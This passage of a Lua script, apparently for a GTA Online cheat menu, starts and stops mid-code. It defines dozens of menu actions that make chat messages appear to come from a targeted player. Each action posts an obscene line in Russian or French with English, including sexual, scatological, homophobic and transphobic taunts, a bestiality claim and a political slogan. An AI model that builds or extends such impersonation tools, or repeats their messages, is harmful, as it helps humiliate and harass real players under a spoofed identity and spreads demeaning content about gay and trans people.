        menu.trigger_commands("say Должен признаться, что я транссексуал.. I am a FemBoy..")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I like to suck bears in the mountain. (Chat as player) ", {"cuckbears"}, "Chat as russian player femboy", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я люблю сосать медведей в горах.  I like to suck bears in the mountain.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I have two dads and I live well. (Chat as player) ", {"twodads"}, "Chat as russian player two dad", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say У меня два папы, и я живу хорошо.  I have two dads and I live well.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I like to put any object in my buttocks! (Chat as player) ", {"objectinass"}, "Chat as russian player two dad", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Мне нравится помещать любой предмет в мои ягодицы! I like to put any object in my buttocks!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I am selling my dildo on EBay. anyone interested? (Chat as player) ", {"dildoebay"}, "Chat as russian player dildow ebay", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я продаю свой фаллоимитатор на EBay. кому интересно? I am selling my dildo on EBay. anyone interested?")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "When I've taken all kinds of drugs I'm a real cocksucker. (Chat as player) ", {"cocksucker"}, "Chat as russian player cock sucker", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Когда я принимаю всевозможные наркотики, я настоящий членосос. When I've taken all kinds of drugs I'm a real cocksucker.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "King Arthur! (Chat as player) ", {"kingarthur"}, "Chat as russian player king arthur", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Кто бы ни вытащил мой член из твоей задницы, мы назовем его королем Артуром! Whoever gets my dick out of your ass, we'll call him King Arthur!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "Putin is sending me to the gulag. I like men. (Chat as player) ", {"putingulag"}, "Chat as russian player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Путин отправляет меня в ГУЛАГ. Мне нравятся мужчины. Putin is sending me to the gulag. I like men.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I've had sex with a horse before. (Chat as player) ", {"sexwithhorse"}, "Chat as russian player sex with horse", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say У меня уже был секс с лошадью. I've had sex with a horse before.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "Aren't you looking for some fresh dick? (Chat as player) ", {"freshdick"}, "Chat as russian player sex fresh dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Разве ты не ищешь свежий член? Aren't you looking for some fresh dick?")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I will sell my mother for a SharkCard! (Chat as player) ", {"freshdick"}, "Chat as french player shrk card", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Продам маму за Шарккард! I will sell my mother for a SharkCard!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I fucked your mother so hard it made a big shit! (Chat as player) ", {"freshdick"}, "Chat as french player big shit", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я так сильно трахал твою мать, что это было большое дерьмо! I fucked your mother so hard it made a big shit!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "You know I insult you but deep down I like you :) (Chat as player) ", {"freshdick"}, "Chat as french player i like you", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ты знаешь, я оскорбляю тебя, но в глубине души ты мне нравишься)  You know I insult you but deep down I like you :)")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I like anything that looks like a dick, so I like you. (Chat as player) ", {"freshdick"}, "Chat as french player like a dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Мне нравится все, что похоже на член, так что ты мне нравишься. I like anything that looks like a dick, so I like you.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "My first pubic hair. (Chat as player) ", {"pubichair"}, "Chat as french player my first pubic hair", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say У меня для вас отличные новости. Вчера у меня появились первые волосы на лобке. I have great news for you. Yesterday I had my first pubic hair.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "When I was a baby my father knocked me down. (Chat as player) ", {"knockedmedown"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Когда я был ребенком, мой отец сбил меня с ног. И моя мать баюкала меня слишком близко к стене. When I was a baby my father knocked me down. And my mother cradled me too close to the wall.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I love playing with my sister's Barbies. (Chat as player) ", {"sisterbarbie"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я люблю играть с Барби моей сестры. I love playing with my sister's Barbies.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "In my childhood, my grandmother's Pinscher fucked my Teddy very hard. (Chat as player) ", {"teddyfucked"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say В детстве бабушкин пинчер очень жестко трахал моего Тедди. In my childhood, my grandmother's Pinscher fucked my Teddy very hard.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "You were still playing with your poop when I got GTA (Chat as player) ", {"poopgta"}, "Chat as french player my poop GTA", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ты все еще играл со своим дерьмом, когда я получил GTA. You were still playing with your poop when I got GTA")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I'm a pro gamer with my trackball mouse. (Chat as player) ", {"poopgta"}, "Chat as french player my trackball mouse", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я профессиональный геймер со своей мышью с трекболом. I'm a pro gamer with my trackball mouse.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "Stupid brother. (Chat as player) ", {"stupidbrother"}, "Chat as french player my stupid brother", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Продаю своего глупого братишку, он научился сидеть, лежать, и лапу отдает.  I'm selling my stupid little brother, he learned to sit, to lie down, and he gives his paw.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "Obama in the white House. (Chat as player) ", {"whitehouse"}, "Chat as french player Obama white house.", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я позволю вам, мне нужно отправить Обаму в Белый дом.  I will lets you, i need to deposit Obama to the White House.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	--- SENTENCES OF MY WITCHIN DAH LOVE <3 

	menu.action(parent3, "i like to eat other people's boogers. (Chat as player) ", {"boogers"}, "Chat as german player peoples boogers", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я люблю есть козявки других людей. I like to eat other people's boogers. ")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I'm punished for playing, Dad still steps on a lego again. (Chat as player) ", {"buildingblocks"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Меня наказывают за игру, папа до сих пор наступает на лего. I'm punished for playing, Dad still steps on a lego again.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "My mother is scolding right now. I have to put away my building blocks...im back soon. (Chat as player) ", {"buildingblocks"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Мама рычит. Я должен убрать свои строительные блоки. Я скоро вернусь. My mother is scolding right now. I have to put away my building blocks...im back soon.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "Im selling my poop on dirty websites. (Chat as player) ", {"dirtywebsites"}, "Chat as german player poop on dirty website", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я продаю свои какашки на темных сайтах. Im selling my poop on dirty websites.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I poop standing up. (Chat as player) ", {"standingup"}, "Chat as german player I poop standing up.", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Какаю стоя. I poop standing up.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "i like man and i really like pipe cleaning. (Chat as player) ", {"pipecleaning"}, "Chat as german player pipe cleaning", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я люблю мужчин и прочищаю трубы. I like man and i really like pipe cleaning.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I'm an Analpirate. Arrr! (Chat as player) ", {"analpirate"}, "Chat as german player analpirate", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я анальный пират. Аррр! Im an Analpirate. Arrr!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "i like to eat the poop of other people (Chat as player) ", {"poopofotherpeople"}, "Chat as german player poop of other people", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Мне нравится есть чужие какашки, трясти по ним ладонью и дрочить на них. I like to eat the poop of other people and im shaking my palm on it and i jerk off on it.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "i like to lick ears of others. (Chat as player) ", {"lickears"}, "Chat as german player ears of others", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я люблю лизать чужие уши. Это действительно хорошо. I like to lick ears of others. Its really tasty. ")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I like do dirty things with minced meat. (Chat as player) ", {"freshdick"}, "Chat as german player minced meat", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я люблю делать грязные вещи с мясным фаршем. I like do dirty things with minced meat.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)


	menu.action(parent4, "Glory to the Lepen ! (Chat as player) ", {"glorytoukraine"}, "Chat as french player glory to Lepen", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Gloire aux Lepen ! Gloire aux Lepen ! Gloire aux Lepen ! Glory to the Lepen ! Glory to the Lepen ! Glory to the Lepen !")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I have a small Dick c=8 (Chat as player) ", {"smalldick"}, "Chat as french player small dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'ai une petite bite c=8 I have a small Dick c=8")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I suck for a cheese burger. (Chat as player) ", {"suckforacheese"}, "Chat as french player suck", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Je suce pour un cheese burger. I suck for a cheese burger.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I like Eric Zemmour and the Lepen's. (Chat as player) ", {"trumpzelensky"}, "Chat as french player trump", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'aime bien Eric Zemmour et les Lepens. I like Eric Zemmour and the Lepen's.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I am a FemBoy. (Chat as player) ", {"iamafemboy"}, "Chat as french player femboy", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Je dois vous avouer que, je suis transexuel.. I am a FemBoy..")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I like to suck bears in the mountain. (Chat as player) ", {"cuckbears"}, "Chat as french player femboy", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'aime sucer des ours dans la montagne.  I like to suck bears in the mountain.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I have two dads and I live well. (Chat as player) ", {"twodads"}, "Chat as french player two dad", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'ai deux Papas et je le vie bien.  I have two dads and I live well.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I like to put any object in my buttocks! (Chat as player) ", {"objectinass"}, "Chat as french player object ass", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'aime mettre toutes sortes d'objets dans mes fesses! I like to put any object in my buttocks!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I am selling my dildo on EBay. anyone interested? (Chat as player) ", {"dildoebay"}, "Chat as french player dildow ebay", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Je vends mon Dildo sur Ebay. Quelqu'un est intéresser? I am selling my dildo on EBay. anyone interested?")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "When I've taken all kinds of drugs I'm a real cocksucker. (Chat as player) ", {"cocksucker"}, "Chat as french player cock sucker", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Quand j'ai pris toutes sortes de drogues je suis un vrais suceur de bites. When I've taken all kinds of drugs I'm a real cocksucker.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "King Arthur! (Chat as player) ", {"kingarthur"}, "Chat as french player king arthur", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Celui qui arriveras à retirer ma bite de tes fesses, on l'appelera le Roi Arthur! Whoever gets my dick out of your ass, we'll call him King Arthur!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "Putin is sending me to the gulag. I like men. (Chat as player) ", {"putingulag"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Poutine envois moi au Goulag. J'aime les hommes. Putin is sending me to the gulag. I like men.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I've had sex with a horse before. (Chat as player) ", {"sexwithhorse"}, "Chat as french player sex with horse", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'ai déjà eu une relation sexuel avec un cheval avant. I've had sex with a horse before.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "Aren't you looking for some fresh dick? (Chat as player) ", {"freshdick"}, "Chat as french player sex fresh dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Y'a pas quelqu'un qui cherche de la bite fraîche ? Aren't you looking for some fresh dick?")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I will sell my mother for a SharkCard! (Chat as player) ", {"freshdick"}, "Chat as french player shrk card", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Je vendrai ma mère pour une SharkCard ! I will sell my mother for a SharkCard!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I fucked your mother so hard it made a big shit! (Chat as player) ", {"freshdick"}, "Chat as french player big shit", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'ai baisé ta mère tellement fort que ça à fait une grosse merde!  I fucked your mother so hard it made a big shit!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "You know I insult you but deep down I like you :) (Chat as player) ", {"freshdick"}, "Chat as french player i like you", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Tu sais je t'insulte mais dans le fond je t'aime bien :)  You know I insult you but deep down I like you :)")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I like anything that looks like a dick, so I like you. (Chat as player) ", {"freshdick"}, "Chat as french player like a dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'aime tout ce qui ressemble à une bite, donc je t'aime bien. I like anything that looks like a dick, so I like you.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "My first pubic hair. (Chat as player) ", {"pubichair"}, "Chat as french player my first pubic hair", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'ai une grande nouvelle à vous annoncer. Hier j'ai eu mon premier poil pubien. I have great news for you. Yesterday I had my first pubic hair.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "When I was a baby my father knocked me down. (Chat as player) ", {"knockedmedown"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Quand j'étais bébé, mon père m'a fait tomber. Et ma mère m'a bercé trop près du mur. When I was a baby my father knocked me down. And my mother cradled me too close to the wall.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I love playing with my sister's Barbies. (Chat as player) ", {"sisterbarbie"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'aime jouer avec les Barbies de ma soeur. I love playing with my sister's Barbies.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "In my childhood, my grandmother's Pinscher fucked my Teddy very hard. (Chat as player) ", {"teddyfucked"}, "Chat as french player my knocked me down", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Dans mon enfance le Pinscher de ma grand-mère baisait mon Teddy très fort. In my childhood, my grandmother's Pinscher fucked my Teddy very hard.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "You were still playing with your poop when I got GTA (Chat as player) ", {"poopgta"}, "Chat as french player my poop GTA", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Tu jouais encore avec ton caca quand j'ai eu GTA. You were still playing with your poop when I got GTA")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I'm a pro game. (Chat as player) ", {"poopgta"}, "Chat as french player my trackball mouse", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Je suis un pro gamer avec ma souris trackball. I'm a pro gamer with my trackball mouse.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "Stupid brother. (Chat as player) ", {"stupidbrother"}, "Chat as french player my stupid brother", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Je vends mon petit frère débile, il a appris assis, coucher, et il donne la patte.  I'm selling my stupid little brother, he learned to sit, to lie down, and he gives his paw.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "Obama in the white House. (Chat as player) ", {"whitehouse"}, "Chat as french player Obama white house.", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Je dois vous laisser, je dois deposer Obama à la maison Blanche.  I will lets you, i need to deposit Obama to the White House.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	--- SENTENCES OF MY WITCHIN DAH LOVE <3 

	menu.action(parent4, "i like to eat other people's boogers. (Chat as player) ", {"boogers"}, "Chat as german player peoples boogers", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'aime manger les crottes de nez des autres. I like to eat other people's boogers. ")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I'm punished for playing, Dad still steps on a lego again. (Chat as player) ", {"buildingblocks"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Je suis punis de jouer, Papa à encore marcher sur un lego. I'm punished for playing, Dad still steps on a lego again.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "My mother is scolding right now. I have to put away my building blocks...im back soon. (Chat as player) ", {"buildingblocks"}, "Chat as french player putin gulag", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Ma mère me gronde. Je dois ranger mes blocs de construction. Je reviens tout de suite. My mother is scolding right now. I have to put away my building blocks...im back soon.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "Im selling my poop on dirty websites. (Chat as player) ", {"dirtywebsites"}, "Chat as german player poop on dirty website", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Je vends mon caca sur des sites sombres. Im selling my poop on dirty websites.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I poop standing up. (Chat as player) ", {"standingup"}, "Chat as german player I poop standing up.", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Je fais caca debout. I poop standing up.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "i like man and i really like pipe cleaning. (Chat as player) ", {"pipecleaning"}, "Chat as german player pipe cleaning", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'aime les hommes et je nettoie les canalisations. I like man and i really like pipe cleaning.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "I'm an Analpirate. Arrr! (Chat as player) ", {"analpirate"}, "Chat as german player analpirate", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say I'm an Analpirate. Arrr! Je suis un Analpirate. Arrr!")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "i like to eat the poop of other people (Chat as player) ", {"poopofotherpeople"}, "Chat as german player poop of other people", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'aime manger le caca des autres et je secoue ma paume dessus et je me branle dessus. I like to eat the poop of other people and im shaking my palm on it and i jerk off on it.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent4, "i like to lick ears of others. (Chat as player) ", {"lickears"}, "Chat as german player ears of others", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say J'aime lécher les oreilles des autres. C'est vraiment bon. I like to lick ears of others. Its really tasty. ")
		util.yield(100)
